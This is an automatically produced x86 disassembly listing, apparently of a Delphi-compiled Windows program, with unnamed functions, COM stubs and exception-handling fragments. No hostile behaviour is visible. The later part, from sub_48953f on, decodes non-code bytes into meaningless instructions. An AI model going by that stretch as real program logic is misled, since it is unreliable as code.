mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_47f13c
push ebp
mov ebp esp
mov eax 0x80004001
pop ebp
retn 0x4
sub_47f20c
push ebp
mov ebp esp
mov eax 0x80004001
pop ebp
retn 0xc
sub_47f268
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x4
sub_47f3b4
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x230 ]
call sub_405a08
lea eax [ ebx + 0x22c ]
call sub_405a08
xor eax eax
pop ebx
pop ebp
retn 0x4
sub_47f43c
push ebp
mov ebp esp
mov eax 0x800401a1
pop ebp
retn 0x8
sub_47f46c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov eax ebx
call sub_4505ec
mov edx [ ebp + 0xc ]
mov [ edx ] eax
xor eax eax
pop ebx
pop ebp
retn 0x8
sub_47f528
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_47f534
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_47f540
push ebp
mov ebp esp
mov eax 0x1
pop ebp
retn 0xc
sub_47f55c
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
xor edx edx
mov [ eax ] edx
mov eax 0x80004001
pop ebp
retn 0x10
sub_47f570
push ebp
mov ebp esp
mov eax 0x80004001
pop ebp
retn 0x18
sub_47f60a
mov edx [ esi + 0x70 ]
mov cl 0xfc
call sub_413958
jmp sub_47f6ea
sub_47f619
lea edx [ ebp - 0x10 ]
mov eax [ esi + 0x8 ]
call sub_47ce9c
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_40f878
jmp sub_47f6ea
sub_47f661
mov eax ebx
mov edx [ esi + 0x68 ]
mov edx [ edx + 0x18 ]
mov cl 0xfc
call sub_413958
jmp sub_47f6ea
sub_47f672
call GetUserDefaultLCID
mov edx eax
mov eax ebx
mov cl 0xfc
call sub_413958
jmp sub_47f6ea
sub_47f684
mov eax ebx
mov dl 0x1
call sub_413b28
jmp sub_47f6ea
sub_47f68f
mov eax ebx
test [ esi + 0x1c ] 0x10
setne dl
xor dl 0x1
call sub_413b28
jmp sub_47f6ea
sub_47f6a2
mov eax ebx
test [ esi + 0x1c ] 0x10
setne dl
call sub_413b28
jmp sub_47f6ea
sub_47f6b2
mov eax ebx
xor edx edx
call sub_413b28
jmp sub_47f6ea
sub_47f6bd
mov eax ebx
xor edx edx
call sub_413b28
jmp sub_47f6ea
sub_47f6c8
mov eax ebx
mov dl 0x1
call sub_413b28
jmp sub_47f6ea
sub_47f6d3
mov eax ebx
mov dl 0x1
call sub_413b28
jmp sub_47f6ea
sub_47f6ea
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47f712
lea eax [ ebp - 0x20 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404a58
retn
sub_47f70b
jmp sub_4039a8
sub_47f712
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x24
sub_47f7c0
jmp sub_4039a8
sub_47f823
jmp sub_4039a8
sub_47f888
jmp sub_4039a8
sub_47f8e5
jmp sub_4039a8
j_sub_403820
jmp sub_403820
sub_47f924
jmp sub_4039a8
sub_47f92b
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_47f938
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_47f944
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x1c
sub_47f950
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x1c
sub_47f98d
jmp sub_4039a8
sub_47f994
pop ebp
retn
sub_47f9e0
jmp sub_4039a8
sub_47f9e7
pop ebp
retn
sub_47fa49
jmp sub_4039a8
sub_47fa50
pop ebp
retn
sub_47fa54
sub [ rw-data ] 0x1
retn
sub_47faa1
jmp sub_4039a8
sub_47faa8
pop ebp
retn
sub_47faac
sub [ rw-data ] 0x1
retn
sub_47fd6c
add eax 0x4
call sub_47fd34
retn
sub_47ff38
push ebx
mov ebx eax
mov dx [ ebx + 0x6 ]
mov ax [ ebx + 0x4 ]
call sub_47f9ec
movzx eax ax
pop ebx
retn
sub_48007c
add esp 0xfffffff8
add eax 0x4
call sub_4806dc
fstp [ esp ]
fwait
fld [ esp ]
pop ecx
pop edx
retn
sub_480224
mov [ eax + 0x8 ] dx
retn
sub_48022c
mov [ eax + 0x10 ] edx
retn
sub_480230
mov [ eax + 0xa ] dx
retn
sub_480238
mov [ eax + 0xc ] dx
retn
sub_480240
mov [ eax + 0x6 ] dx
retn
sub_480248
mov [ eax + 0xe ] dx
retn
sub_480250
mov [ eax + 0x4 ] dx
retn
sub_480258
mov [ edx ] 0x0
lea eax [ edx + 0x8 ]
call sub_40d788
retn
sub_48033e
jmp sub_4039a8
sub_48036b
jmp sub_4039a8
sub_480372
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48038f
lea eax [ ebp - 0x2c ]
call sub_403fa4
retn
sub_480388
jmp sub_4039a8
sub_48038f
pop ebx
mov esp ebp
pop ebp
retn
sub_480474
jmp sub_4039a8
sub_4804ab
jmp sub_4039a8
sub_4804b2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_480508
mov eax [ edx + 0x8 ]
retn
sub_480685
jmp sub_4039a8
sub_48068c
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_480860
jmp sub_4039a8
sub_480867
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4808a1
jmp sub_4039a8
sub_4808a8
pop ebp
retn
sub_4808ac
sub [ rw-data ] 0x1
jae r-xdata
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_415184
mov [ rw-data ] eax
sub_480bd8
jmp sub_4039a8
sub_480bdf
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_480be8
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc28
call sub_4039e0
pop ebx
retn
sub_480c00
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc28
call sub_4039e0
pop ebx
retn
sub_480c40
add edx 0x4
call sub_480c18
retn
sub_480c74
add edx 0x4
call sub_480c4c
retn
sub_480cd8
push ebx
push esi
mov esi edx
mov ebx eax
lea edx [ esi + 0x4 ]
lea eax [ ebx + 0x4 ]
call sub_4834a8
inc eax
pop esi
pop ebx
retn
sub_480d4d
jmp sub_4039a8
sub_480d54
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_480d9d
jmp sub_4039a8
sub_480da4
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_480dac
push ebx
mov ebx eax
mov eax ebx
call sub_480d5c
pop ebx
retn
sub_480db8
add esp 0xfffffff8
mov edx esp
add eax 0x4
call sub_483dd8
fild [ esp ]
pop ecx
pop edx
retn
sub_480e54
jmp sub_4039a8
sub_480e5b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_480ebe
jmp sub_4039a8
sub_480ec5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_480ecc
movsx edx dx
call sub_480e64
retn
sub_480ed8
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
add eax 0x4
mov ecx 0x4
mov edx 0x20
call sub_483d4c
pop ebp
retn 0x8
sub_480fe0
jmp sub_4039a8
sub_48108f
jmp sub_4039a8
sub_4810f4
mov [ edx ] 0x0
lea eax [ edx + 0x8 ]
call sub_40d788
retn
sub_4811e4
jmp sub_4039a8
sub_481211
jmp sub_4039a8
sub_481218
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_481235
lea eax [ ebp - 0x2c ]
call sub_403fa4
retn
sub_48122e
jmp sub_4039a8
sub_481235
pop ebx
mov esp ebp
pop ebp
retn
sub_48131f
jmp sub_4039a8
sub_481356
jmp sub_4039a8
sub_48135d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_481408
mov eax [ edx + 0x8 ]
retn
sub_48147a
jmp sub_4039a8
sub_481481
pop ebx
pop ecx
pop ebp
retn
sub_4814d0
jmp sub_4039a8
sub_4814d7
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_4815fe
jmp sub_4039a8
sub_481605
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4816fa
jmp sub_4039a8
sub_481701
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_4818a0
jmp sub_4039a8
sub_4818a7
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
sub_481aa7
jmp sub_4039a8
sub_481aae
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_481cae
jmp sub_4039a8
sub_481cb5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_481ead
jmp sub_4039a8
sub_481eb4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4821d8
jmp sub_4039a8
sub_4821df
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4823ad
jmp sub_4039a8
sub_4823b4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_482551
jmp sub_4039a8
sub_482558
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4827cb
jmp sub_4039a8
sub_4827d2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_482961
jmp sub_4039a8
sub_482968
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_482a58
jmp sub_4039a8
sub_482a5f
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_482e85
jmp sub_4039a8
sub_482e8c
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_483695
jmp sub_4039a8
sub_48369c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_483700
jmp sub_4039a8
sub_483707
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_483846
jmp sub_4039a8
sub_48384d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4838bc
jmp sub_4039a8
sub_4838c3
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_483ba3
jmp sub_4039a8
sub_483cfb
jmp sub_4039a8
sub_483d02
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_483d40
mov al [ eax + 0x1 ]
and al 0x3f
and eax 0xff
retn
sub_483ea1
jmp sub_4039a8
sub_483ea8
pop ebp
retn
sub_483eac
sub [ rw-data ] 0x1
jae r-xdata
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_415184
mov [ rw-data ] eax
sub_48419d
add eax 0xffffffec
jmp r-xdata
retn
sub_4841a5
add eax 0xffffffec
jmp sub_484300
sub_4841ad
add [ esp + 0x4 ] 0xffffffec
jmp sub_405ab4
sub_4841b7
add [ esp + 0x4 ] 0xffffffec
jmp sub_405adc
sub_4841c1
add [ esp + 0x4 ] 0xffffffec
jmp sub_405af0
sub_4841cb
add eax 0xffffffe8
jmp r-xdata
mov al [ eax + 0xc ]
retn
sub_4841d3
add eax 0xffffffe8
jmp r-xdata
mov [ eax + 0xc ] dl
retn
sub_4841db
add [ esp + 0x4 ] 0xffffffe8
jmp sub_405ab4
sub_4841e5
add [ esp + 0x4 ] 0xffffffe8
jmp sub_405adc
sub_4841ef
add [ esp + 0x4 ] 0xffffffe8
jmp sub_405af0
sub_484300
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x10 ]
mov edx esi
call sub_403ff8
pop esi
pop ebx
retn
sub_484364
jmp sub_4039a8
sub_48436b
pop ebp
retn
sub_4843d1
jmp sub_4039a8
sub_4843d8
pop ebp
retn
sub_484479
jmp sub_4039a8
sub_484480
pop ebp
retn
sub_484484
sub [ rw-data ] 0x1
retn
sub_4847b2
jmp sub_4039a8
sub_4847b9
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4847db
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403fc8
retn
sub_4847d4
jmp sub_4039a8
sub_4847db
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4848e2
jmp sub_4039a8
sub_4848e9
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48490b
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403fc8
retn
sub_484904
jmp sub_4039a8
sub_48490b
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_484a9c
jmp sub_4039a8
sub_484aa3
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_484acd
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_403fc8
lea eax [ ebp - 0xc ]
call sub_403fa4
retn
sub_484ac6
jmp sub_4039a8
sub_484acd
mov al [ ebp - 0x1 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_484b20
mov edx [ rw-data ]
mov edx [ edx ]
xchg edx eax
call sub_468bf4
retn
sub_484b55
jmp sub_4039a8
sub_484b5c
pop ebp
retn
sub_484bb4
add [ eax + ecx * 2 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
sub_484e9f
jmp sub_4039a8
sub_484ea6
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_484f2a
jmp sub_4039a8
sub_484f31
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_484fa3
jmp sub_4039a8
sub_484faa
pop ebx
pop ecx
pop ebp
retn
sub_485014
jmp sub_4039a8
sub_48501b
pop ebx
pop ecx
pop ebp
retn
sub_485020
push ebx
mov ebx eax
mov eax [ ebx + 0x318 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov eax [ ebx + 0x2fc ]
mov edx [ eax ]
call [ edx + 0xc4 ]
pop ebx
retn
sub_485088
jmp sub_4039a8
sub_48508f
pop ebx
pop ecx
pop ebp
retn
j_sub_4039a8#9
jmp sub_4039a8
sub_4850cb
pop ebp
retn
sub_4850d0
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax [ rw-data ]
mov [ eax ] r-xdata
sub_4850e9
add eax 0xfffffff4
jmp sub_485248
sub_4850f1
add eax 0xfffffff4
jmp sub_48525c
sub_4850f9
add eax 0xfffffff4
jmp sub_4852ac
sub_485101
add [ esp + 0x4 ] 0xfffffff4
jmp sub_405ab4
sub_48510b
add [ esp + 0x4 ] 0xfffffff4
jmp sub_405adc
sub_485115
add [ esp + 0x4 ] 0xfffffff4
jmp sub_405af0
sub_485127
add eax 0xfffffff0
jmp sub_48526c
sub_48512f
add [ esp + 0x4 ] 0xfffffff0
jmp sub_405ab4
sub_485139
add [ esp + 0x4 ] 0xfffffff0
jmp sub_405adc
sub_485143
add [ esp + 0x4 ] 0xfffffff0
jmp sub_405af0
sub_485248
push ebx
mov ebx edx
mov edx ebx
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46a720
pop ebx
retn
sub_48525c
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46aa60
retn
sub_4852ac
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46a76c
retn
j_sub_4039a8#8
jmp sub_4039a8
sub_48537a
pop ebp
retn
sub_485410
retn
j_sub_4039a8#7
jmp sub_4039a8
j_sub_485410
jmp sub_485410
sub_485418
pop ebp
retn
sub_48541c
sub [ rw-data ] 0x1
retn
sub_485449
jmp sub_4039a8
sub_485450
pop ebp
retn
sub_485454
sub [ rw-data ] 0x1
retn
sub_485481
jmp sub_4039a8
sub_485488
pop ebp
retn
sub_48548c
sub [ rw-data ] 0x1
retn
j_sub_4039a8#6
jmp sub_4039a8
sub_4854c0
pop ebp
retn
sub_4854c4
sub [ rw-data ] 0x1
retn
j_sub_4039a8#5
jmp sub_4039a8
sub_4854f8
pop ebp
retn
sub_4854fc
sub [ rw-data ] 0x1
retn
sub_487208
mov edx rw-data
mov [ eax + 0x30 ] edx
retn
j_sub_4039a8#4
jmp sub_4039a8
sub_487277
pop ebx
pop ecx
pop ebp
retn
sub_48727b
add [ esi - 0x6ac0b579 ] cl
retn
sub_487ebb
jmp sub_4039a8
sub_487ec2
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_487ec8
mov edx rw-data
mov [ eax + 0x30 ] edx
retn
j_sub_4039a8#3
jmp sub_4039a8
sub_487f37
pop ebx
pop ecx
pop ebp
retn
sub_4880f9
jmp sub_4039a8
sub_488100
pop ebp
retn
sub_488104
sub [ rw-data ] 0x1
retn
sub_48953f
mov ebp 0xfd793ebd
aad 0x12
mov ebp ebp
0x558dfb34 0x9348
sub_489b0e
xor al 0xf0
dec ebx
in al 0x30
clc
pop ecx
in eax dx
clc
mov ch 0xdb
xor al 0xf0
inc ebp
push ebp
iretd
sub_489c61
push esp
fisttp [ ebx + 0x2d2dbdbd ]
xor al bh
push ebp
in eax dx
clc
mov ch 0x54
mov [ edx + eax * 2 + 0x42 ] ss
sub eax 0x422d2d2d
jmp r-xdata
sub_489c9b
out dx al
push esp
popad
mov ebp 0x2d2dbdbd
sub eax 0x2d2d2d2d
sub eax 0x59c8422d
xor al 0xe0
popad
inc edx
0xf54eaa5 0xbdb2
sub_48a92d
dec esp
push ebp
mov dl 0x38
retn 0x425c
sub_48aa0e
xor al 0xf8
push ecx
in eax 0x54
adc al 0x40
inc edx
inc edx
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
inc edx
0x74e3e2ed 0x2d7e
sub_48ab48
pop ebp
in al dx
push esp
fwait
mov eax 0x2d2dbdbd
inc edx

sub_48ad2f
mov [ edx - 0x38 ] eax
pop ecx
inc edx
0x5661549d 0x4242
sub_48aec1
xor al 0xe0
popad
out 0x54 al
0x4256
sub_48af54
mov ecx 0x2d2dbdbd
sub eax 0x3b342d2d
dec ebp
mov ebp 0xf830bdbd
pop ebp
in eax dx
jpe r-xdata
mov ebp 0x5df830bd
pop ebp
fcomp st1

sub_48b1f7
0x7adc
sub_48b264
dec edx
inc edx
inc edx
push esp
0xbdb5
sub_48b513
test al 0xbd
mov ebp 0xb27d38e4
cmp [ edx + ecx * 2 - 0x48abbdbe ] esp
dec edx
inc edx
inc edx
0xff54428e 0xbda4
sub_48b52b
mov ebp 0x2d2d2d2d
xlat
jmp r-xdata
xor cl bh
cdq
test ebp ebp
xor cl bh
cdq
int1
in eax dx
0xea9dd7ea 0x54ea
sub_48b985
int 0xd8
jpe r-xdata
clc
jno r-xdata
insd
iretd
sub eax 0x2d2d2d2d
inc edx

sub_48b98b

sub_48ba7f
dec ecx
push esp
mov esi [ edi + 0x2d2dbdbd ]
sub eax 0x39f8302d
in eax dx
jmp r-xdata
xor al 0xe0
inc ecx
xor al 0xf0
sub_48bb32
xor al 0xf0
ror [ esi - 0x4f18ab9a ] 0x1
mov ebp 0x2d2d2dbd
sub eax 0xede034db
xlat
iretd
sub_48bbb6
xor al 0xf8
push ecx
in eax 0xd7

sub_48c07c
mov ebp 0xedeb42ed
0xbd112b42 0xbdbd
sub_48c0a0
mov cl 0xbd
mov ebp 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x4245f834
0x42b054e9 0x4242
sub_48c44e
mov ch 0xee
jmp sub_48c4a6
sub_48c5de
0x5441f834 0x76c6
sub_48c7b7
inc edx
inc edx
aad 0x70
lodsb [ esi ]
mov edi 0xfb34ead8
popfd
push ebp
cmp eax 0xd5424241
sub ch [ esi + 0x34ea039c ]
sti
mov ch 0x55
iretd
sub_48c9e3
cmp eax 0x2d424246
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0xaff834db
in eax 0xd7

sub_48cc6f
inc ebp
xlat
fldl2e
inc edx
sub ecx [ 0xffffffffeebdbdbd ]
0xbd092b42 0xbdbd
sub_48cdb8
xchg ecx eax
fstp [ eax ]
jge r-xdata
insd
inc edx
inc edx
push esp
cmp al 0xbd
mov ebp 0xd72d2dbd
xchg ebx eax
cmp [ eax ] edx
mov esp 0x3edbbdbd
sub_48ce29
0x4254 0x425f
sub_48d08c
xor al 0xe0
stc
xlat
iretd
sub_48d210
popad
ror dh cl
rcr bl cl
jpe r-xdata
clc
pop ebp
leave
popfd
cmc

sub_48d7e5
push esp
retn
sub_48dc92
xor al 0xa9
int3
sub_48de9a
inc edx
sub eax 0x3e2d2d2d
retn 0xbdb9
sub_48df80
0x74e3e2ed 0x2d7e
sub_48dfad
imul esi eax 0x7acfded4
clc
ror dh cl
rcr bl cl
jpe r-xdata
popad
leave
popfd
cmc

sub_48e100
xlat
mov [ 0x4267c354 ] eax
inc edx
sub eax 0x372d2d2d
lodsb [ esi ]
push esp
mov ebp 0x2d424266
sub eax 0x428eea2d
0xf830b9d7 0xed41
j_sub_4039a8#2
jmp sub_4039a8
sub_48e374
pop ebp
retn
j_sub_4039a8
jmp sub_4039a8
sub_48e546
pop edi
pop esi
pop ebx
pop ebp
retn
sub_48e59f
jmp sub_4039a8
sub_48e5a6
pop ebp
retn
